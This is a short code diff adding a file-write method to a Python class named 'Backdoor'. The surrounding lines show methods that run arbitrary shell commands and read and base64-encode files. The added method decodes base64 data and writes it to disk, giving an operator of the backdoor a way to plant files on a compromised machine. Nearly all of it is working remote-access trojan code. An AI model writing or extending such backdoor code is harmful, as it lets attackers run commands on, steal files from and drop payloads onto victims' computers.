@@ -33,6 +33,11 @@ class Backdoor:
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
 
+    def write_file(self, path, content):
+        with open(path , "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Download successful"    
+
     def read_file(self, path):
         with open(path, "rb") as file:
             return base64.b64encode(file.read())
